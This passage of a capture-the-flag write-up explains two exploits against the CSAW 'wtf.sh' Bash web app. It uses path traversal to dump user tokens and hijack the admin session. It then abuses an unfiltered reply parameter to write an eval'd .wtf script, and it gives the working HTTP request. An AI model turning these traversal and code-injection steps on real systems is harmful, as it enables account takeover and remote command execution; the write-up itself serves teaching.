            echo "&lt;html&gt;&lt;title&gt;404&lt;/title&gt;&lt;body&gt;404, not found:&lt;code&gt;${request[1]}&lt;/code&gt;&lt;/body&gt;&lt;/html&gt;"
            log "404: ${request[@]}"
        fi
        exit 0
    fi
}

# start socat on specified port
function start_server {
    echo "wtf.sh ${VERSION}, starting!";
    socat -T10 TCP-LISTEN:$2,fork,readbytes=4096,backlog=256,reuseaddr EXEC:"$1 -r" 9&gt;&amp;1
    echo "Socket was occupied... try again later...";
}

if [[ $# != 1 ]]
then
    echo "Usage: $0 port"
    exit
fi

if [[ $1 == '-r' ]]
then
    handle_connection
else
    start_server $0 $1 # start server on specified port
fi</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=NONE"></a></span>
<span class="post-title"></span>
<span class="post-body"></span>
</div>

...

...

~~~


Yes, those are the sources. More than a half of job is done. I hit around the server to extract clean scripts like `/lib.sh` or `/user_functions.sh` and pulled out pretty much everything that didn't have the `.wtf` extension (see [here](https://gist.github.com/0xBADCA7/78a33db8245f3333599ba44d028714d9)). Looking into the scripts we can see that there's that `get_flag1` command we need to execute to get the flag. Clearly, we need to be able to get in as the `admin` user:

~~~ bash

if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
then
    get_flag1
fi

~~~

... and `is_logged_in` is verbatim:

~~~ bash

function is_logged_in {
    contains 'TOKEN' ${!COOKIES[@]} && contains 'USERNAME' ${!COOKIES[@]};
    local has_cookies=$?
    local userfile=$(find_user_file ${COOKIES['USERNAME']});
    [[ ${has_cookies} \
        && ${userfile} != 'NONE' \
        && $(tail -n1 ${userfile} 2>/dev/null) = ${COOKIES['TOKEN']} \
        && $(head -n1 ${userfile} 2>/dev/null) = ${COOKIES['USERNAME']} \
    ]];
    return $?;
}

~~~


The code examines the cookie, looks for `USERNAME` and `TOKEN` and compares those to that stored in user file. You might be curious to know where it stored the user data so was I and looked into the `find_user_file` function:

~~~

function find_user_file {
    local username=$1;
    local hashed=$(hash_username "${username}");
    local f;
    if [[ -n "${username}" && -e "users_lookup/${hashed}" ]]
    then
        echo "users/$(cat "users_lookup/${hashed}/userid")";
    else
        echo "NONE"; # our failure case -- ugly but w/e...
    fi;
    return;
}

~~~


It is obvious that the credentials we look for are in `users` folder. Recalling how we got the sources it was easy to use that to see if we can read the `users` folder by hitting `http://web.chal.csaw.io:8001/post.wtf?post=../users`. Luckily we had all the required permissions to do so and recovered the admin hash:

~~~



<html>
<head>
<link rel="stylesheet" type="text/css" href="/css/std.css" >
<link rel="stylesheet" type="text/css" href="/css/post.css" >
</head>
<body>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=2KP1G">Acid Burn</a></span>
<span class="post-title">cf45d70f9bdb54391a9ac88f2cd547bceec8e6ab</span>
<span class="post-body">SwJMhklbaNTESIjfxs1OXG8X2+OwhxLg7D8eMo6HXENTuh21VGgSQDjxUlLoZmKWl7w2m7S2hadc0pYGfev9Lw==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=4lVHV">Neo</a></span>
<span class="post-title">4e31381620ef61ee0dbd8ef4060129c92dd8bd75</span>
<span class="post-body">A4j4tZsB2q+RiUNrFwhqw/jUVn2hgD1MNIuGzoj1nlkXvIrFSsgEoJDnyng7IsIBSQM6MtTZg39Ld5sx3oHdnA==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=4xwvM">The Plague</a></span>
<span class="post-title">3bbc9c6c13623086031acf000ccc517c2fc4aeee</span>
<span class="post-body">d/t4trsgbJ0Q0KIXTpsTVhAS7PrjVqbbUVxMSE+ol4Qp6K+xOmEozQ7Co4/BGqXDm/fcYK/vm4K2ujtZYw+ZqQ==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=7tiGt">The Laughing Man</a></span>
<span class="post-title">8643737572a192ce15701fadf063a0b7e1d35f61</span>
<span class="post-body">PXCM2ORmTNrFnUlhU6LXVPOXmzBLGF4XAb32FQulIOTqxVEEq6nQyfk5dF0VflG2t4qFLUhRYh1S1Nxg6l/vhQ==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=B1sXv">Hackerman</a></span>
<span class="post-title">5f589f2d3b7639db16d9148baa441570673d050c</span>
<span class="post-body">5w+zmn+/2kEkXU11cWTqUoEppGGhdydCGUhq8oHmbYY5fpZhYQgmxHCwGaFdo6DHYpsAgZ45mvt/VzeONMDwpg==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=PxaR5">Morpheus</a></span>
<span class="post-title">5daa999772ce52c15694dfd16edd6bc130bea5fc</span>
<span class="post-body">8Ho5dw0S4IZV1X50HJ4vY5aluEb1mSGoiLqqzPXXU9kBw05GaXeQyQaPyF6VDJN/5QxtKmUmHURQaRVQ8RLlSw==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=QNI5P">admin</a></span>
<span class="post-title">3f0b1ebe20e3682b1a5d701590ad76fb051d3a08</span>
<span class="post-body">ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=WLfBX">Phantom Phreak</a></span>
<span class="post-title">feee3b8a0d764b81404a0e9eb0b5ae8d750de411</span>
<span class="post-body">4tV3v4Sql5T1Ynorf/eiNrnugH0VQPmbsQOqhp5EwktQtKK8VMFrM0QE/SNk+mnKeid2L9CgXMqqLifuDdTXvQ==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=bS5it">Trinity</a></span>
<span class="post-title">2079d029c1f22f1c4c6a4b47f4d3d0a581badd01</span>
<span class="post-body">RYrFTRbFRTZhplFABj98E3VAAPyXH4sd33KTJFNANh4Avj7QCYbFQEPGap2FCOvurthiKFrUcUrS7GaLPWd13g==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=d9VyL">Cereal Killer</a></span>
<span class="post-title">6df0f446aa743d4a6910113a11629973fa320349</span>
<span class="post-body">UcqXnJJ9RaVxQ9xk1EcLQ5aXu2v84/pgd6UjIyd2qNYXKYyJlpNrSMtWRqqDbEfRnEVvms2qY+N5CxzLFKW1fg==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=lCuIv">The Puppet Master</a></span>
<span class="post-title">46bd2c4d48bdbba6d9e0323c4a1fb7fae17db776</span>
<span class="post-body">EIeoPnCf8inJCWjC0tEYbfQfAl1GzYrI67GjQXQQ2Y9jEPimfXFJGrATdwXUg5WXIwWNKAUH5OBKd3Gn3VNDFg==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=pkgPD">Zero Cool</a></span>
<span class="post-title">2ebd8e0fd3a035f6eeda17f2598ce6115fd52ebb</span>
<span class="post-body">FADs3TTAF5XG30ZGgx+A3o1+MPjLC6j+2FORNFyPwU1wckQjELcoLeu2Qv7Sbu3A8CHY/aC4DOhqErl4jlxVbQ==</span>
</div>
<div class="post">
<span class="post-poster">Posted by <a href="/profile.wtf?user=qmxCS">dude</a></span>
<span class="post-title">8910ee7d68dfff68460731ea37eb0d406d07862d</span>
<span class="post-body">vYfNLcTDovItCaF4BBwNq/SNYMSIJsoLF3Z/jxYmbPuea7IpH/bqtyQrr6TyAQrvEm5oI5zpHiC/012n9BPoYA==</span>
</div>

<div class="action-btns">
<a href="/reply.wtf?post=../users">Reply</a>
<a href="/">Back</a>
</div>

</body>
</html>

~~~

Picking the admin hash from the dump and using it as the `TOKEN` cookie value and `admin` as `USERNAME` logged me in and triggered the `get_flag1` command after visting the admin's profile page:

![](http://i.imgur.com/q5jeJ6p.png)


# Part II

In the second part of this challenge things got a little bit trickier. I had my dose of Bash already and trying to figure out where another issue was hiding meant headache. I started out by looking how the `shopt -s extglob` setting (found at the top of `wtf.sh`) could help me. I used the `*` operand in various inputs (e.g. a username or post title) to see if it was of any help. It did in fact trigger expansion e.g. when creating a new post with both title and contents values set to `*`:

~~~

Posted by admin
1157399072.sandbox
1157399072.sandbox
Reply Back

~~~

You might be wondering what those sandboxes are but those are nothing else but folders created by the main script to "sandbox" the requests:

~~~ bash

# if we know the IP (via an X-Forwarded-For header), stick the user in a sandbox
# (Cloudflare will fill in this IP in prod, we can also have nginx fill it in in dev if we want)
if contains "X-Forwarded-For" "${!HTTP_HEADERS[@]}"
then
    sandbox_dir="$((cksum <<< ${HTTP_HEADERS["X-Forwarded-For"]}) | cut -d\  -f1).sandbox";
    # create sandbox if it doesn't exist
    if [[ ! -e "${sandbox_dir}" ]]
    then
        mkdir "${sandbox_dir}";
        # copy anything that isn't itself a sandbox to the dir
        cp -R !(*.sandbox) "${sandbox_dir}";
    fi
    cd "${sandbox_dir}";
else
    log "WARNING: Not sandboxing: no X-Forwarded-For header found!"
fi

~~~

Essentially, what that code does is that it examines the `X-Forwarded-For` header which we can control (however to no use or at least not much use - can help "chroot" into another folder if for some reason the original one belonging to my IP was screwed) and copies the contents in the root of the server into that sandbox. Back to the expansion, there were numerous places like that which would allow me trigger expansion however all to no use b/c I already had the file names and paths I needed. There wasn't any mistake in the code that would allow code exection unless a control flow issue (i.e. "business logic") was to be found ... which it was. 

"How are `.wtf` files being executed?" I asked myself and the sources told me that there was a magic function `include_page`:

~~~ bash

function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
            is_script=$?;

            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'\n'"${line#"$"}";
            else
                if [[ -n $cmd ]]
                then
                    eval "$cmd" || log "Error during execution of ${cmd}";
                    cmd=""
                fi
                echo $line
            fi
        done < ${pathname}
    else
        echo "<p>Max include depth exceeded!<p>"
    fi
}

~~~

... which was used to run those `.wtf` scripts. Clearly, if a file had the `.wtf` extension and the first char in line was `$` then the string after the symbol would be piped into a command and `eval`'ed. If only we could create a `.wtf` script ourselves then we could call any shell command or function by simply calling the script as any other "normal" script like `new_post.wtf`.

Having the plan in place, I started looking for a flaw that would allow me write arbitrary or nearly arbitrary content to an arbitrary file that would be in the server path (if it was in `/tmp` we would not be able to do that I guess as the web server was already runnning under `/tmp/wtf_runtime/wtf.sh/` and path traversal was prohibited). After gazing at the code more and more I figured out that the reply functionality was compeltely cheesy:

~~~ bash

function reply {
	local post_id=$1;
	local username=$2;
	local text=$3;
	local hashed=$(hash_username "${username}");

	curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
	next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
	next_file=(posts/${post_id}/${next_reply_id});
	echo "${username}" > "${next_file}";
	echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
	echo "${text}" >> "${next_file}";

	# add post this is in reply to to posts cache
	echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}

~~~

The core issue is that `$post_id` is completely under our control and comes unfiltered from the query string as well as `$username` and `$text`:

~~~ bash

$ source user_functions.sh
$ source post_functions.sh
$ if [[ $method = 'POST' ]]
$ then
$   if is_logged_in
$   then
$       if [[ ${POST_PARAMS['text']} != '' && ${URL_PARAMS['post']} != '' ]]
$       then
$           reply "${URL_PARAMS['post']}" "${COOKIES['USERNAME']}" "${POST_PARAMS['text']}"
$           redirect "/post.wtf?post=${URL_PARAMS['post']}#${next_post_id}";
$       else
$           redirect "/reply.wtf?post=${URL_PARAMS['post']}";
$       fi
$   else
$      redirect "/login.wtf"
$   fi
$ fi

~~~

To better understand what's really going on in the `reply` function it is best to [demonstrate](https://gist.github.com/0xBADCA7/78a33db8245f3333599ba44d028714d9/#file-reply2-sh) this with a few debug statements:

~~~ bash

# Demonstrates what's wrong with the reply() function
# not part of the challenge
function reply2 {
	local post_id=$1;
	local username=$2;
	local text=$3;
	local hashed=$(hash_username "${username}");

	curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
	next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
	next_file=(posts/${post_id}/${next_reply_id});
	echo "${username}" > "${next_file}";
	echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
	echo "Test RE: $(nth_line 2 < "posts/${post_id}/1")"
	echo "${text}" >> "${next_file}";

	# add post this is in reply to to posts cache
	echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";

	echo "*** Debug ***";
	echo "curr_id ->" $curr_id
	echo "next_reply_id ->" $next_reply_id
	echo "next_file ->" $next_file
	echo ""
	echo '${post_id}/${next_reply_id} ->' "${post_id}/${next_reply_id}"
	echo 'posts/${post_id}/1 ->' "posts/${post_id}/1"
}

~~~

Testing in terminal:

~~~

> source reply2.sh
> reply2 '../anyfile.wtf x' '$ get_flag2' '$ </home/flag2/flag2.txt'
bash: posts/../anyfile.wtf x/1: No such file or directory
bash: posts/../anyfile.wtf x/1: No such file or directory
Test RE:
bash: users_lookup/a837bb1a7929d6802551ef813cd1e070ef65e777/posts: No such file or directory
*** Debug ***
curr_id -> anyfile.wtf
next_reply_id -> 1
next_file -> posts/../anyfile.wtf
 
${post_id}/${next_reply_id} -> ../anyfile.wtf x/1
posts/${post_id}/1 -> posts/../anyfile.wtf x/1

> cat posts/../anyfile.wtf
$ get_flag2
RE:
$ </home/flag2/flag2.txt

~~~

We control all the parameters so all we need to do is register a user `$get_flag2` and make a reply using that user (text parameter is actually not needed):


~~~ http

POST /reply.wtf?post=../anyfile.wtf+x HTTP/1.1
Host: web.chal.csaw.io:8001
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Cookie: USERNAME=$get_flag2; TOKEN=E0oFQJbFgdkLk45TFhAOOsQxnLbnzMRuE2/24fYJj9P0ExT+2XDGYQuVYoD4efYkfwrG17TjdaQ5WubTv8nl7A==

text=$get_flag2

~~~

Response:

~~~ http

HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sun, 18 Sep 2016 05:35:41 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: wtf.sh 0.0.0.0.1 "alphaest of bets"
X-Bash-Fact: The idomatic way of iterating over all the lines in a file in bash is `while read -r line; do ; done < `
Content-Length: 65


Flag: flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}
ÿÿÿ
RE:

~~~

> Read the manual if unsure, post comment(s) if unclear.
